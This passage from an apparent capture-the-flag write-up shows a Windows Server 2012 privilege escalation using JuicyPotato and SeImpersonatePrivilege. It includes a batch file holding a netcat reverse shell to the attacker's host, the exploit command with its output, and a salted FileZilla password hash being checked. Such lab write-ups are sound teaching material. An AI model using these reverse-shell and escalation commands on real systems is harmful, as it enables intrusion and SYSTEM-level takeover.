SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

This would typically mean I could use [JuicyPotato](https://github.com/ohpe/juicy-potato), as long as the box isn’t Server2019. Luckily, it’s older:

```

c:\>systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          9/28/2019, 10:03:06 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2400 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 4/5/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 4,440 MB
Virtual Memory: Max Size:  7,807 MB
Virtual Memory: Available: 5,689 MB
Virtual Memory: In Use:    2,118 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.158
                                 [02]: fe80::f003:c7bd:7b8c:88aa
                                 [03]: dead:beef::f003:c7bd:7b8c:88aa
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

```

### JuicyPotato

I’ll grab the binary from the [JuicyPotato release page](https://github.com/ohpe/juicy-potato/releases) and drop it into my share. I’ll copy `nc64.exe` and `rev.bat` onto Json, where `rev.bat` is just a `nc` rev shell:

```

c:\>copy \\10.10.14.10\share\nc64.exe \windows\system32\spool\drivers\color\
        1 file(s) copied.

c:\>copy \\10.10.14.10\share\rev.bat \windows\system32\spool\drivers\color\
        1 file(s) copied.
        
c:\>type \windows\system32\spool\drivers\color\rev.bat
\windows\system32\spool\drivers\color\nc64.exe -e cmd.exe 10.10.14.10 443

```

Now I’ll select a CLSID from the [JuicyPotatio documentation for this OS](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter) that is associated with SYSTEM and give it a run:

```

c:\>\\10.10.14.10\share\JuicyPotato.exe -t * -p \windows\system32\spool\drivers\color\rev.bat -l 9001 -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 9001
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

```

In my `nc` listener in another window, I get a shell as SYSTEM:

```

PS > nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.158] 64696
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

And from there, I can grab root.txt:

```

C:\Users\superadmin\Desktop>type root.txt
3cc85d1b************************

```

## Beyond Root

### FileZilla Hash

In the config file for FileZilla, there’s a password hash and a salt:

```

<User Name="superadmin">
    <Option Name="Pass">813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0</Option>
    <Option Name="Salt">cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0</Option>

```

[This thread on the FileZilla forums](https://forum.filezilla-project.org/viewtopic.php?f=6&t=39934) says that hash is SHA512, with the password then salt.

My gut instinct was to just append the two and calculate the hash, but it didn’t match:

```

root@kali# echo -n 'funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0' | sha512sum 
a02cbaeb712adaa4f8f84046606596a627e2ddb99eace7023febca9c4d5d89ae1ce2b34138495aee34d112973d445e2a0fbe354174e7e8f86b37bafd98efe0eb  -

```

The forums say that the salt should be 64 characters. Why is mine 80?

```

root@kali# echo -n 'cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0' | wc -c
80

```

Looking more closely, I see things like `&lt;`, `&gt;`, and `&quot;`. Those are HTML entities. If I [decode them](https://stackoverflow.com/questions/5929492/bash-script-to-convert-from-html-entities-to-characters), I get 64:

```

root@kali# echo -n 'cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0' | perl -MHTML::Entities -pe 'decode_entities($_);' | wc -c
64

```

Back to the initial password + salt -> hash:

```

root@kali# echo -n 'funnyhtbcwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0' \
> | perl -MHTML::Entities -pe 'decode_entities($_);' \
> | sha512sum 
813ccfb086cb6c9046f13f1e10d5222ecb63e11a809c133580577b5597d28eb079f6ddd5aa52d1503bed569c72b589f165fc02993c51e0994a6290a0356ec2a0  -

```

That matches what’s in the file.

Since `funnyhtb` isn’t in any wordlists I use, I wasn’t going to crack this password.

### File System to Shell

With the FileZilla admin port I got full disk access to the server. I wanted to go from there to shell.

First, I gave myself full disk access rooted at `C:\`, read and write:

![image-20200214160159751](https://0xdfimages.gitlab.io/img/image-20200214160159751.png)

Now I should be able to do [DiagHub just like in RE](/2020/02/01/htb-re.html#path-2-zipslip), writing a dll into `system32`, and then uploading an executable to run it to get a shell as SYSTEM.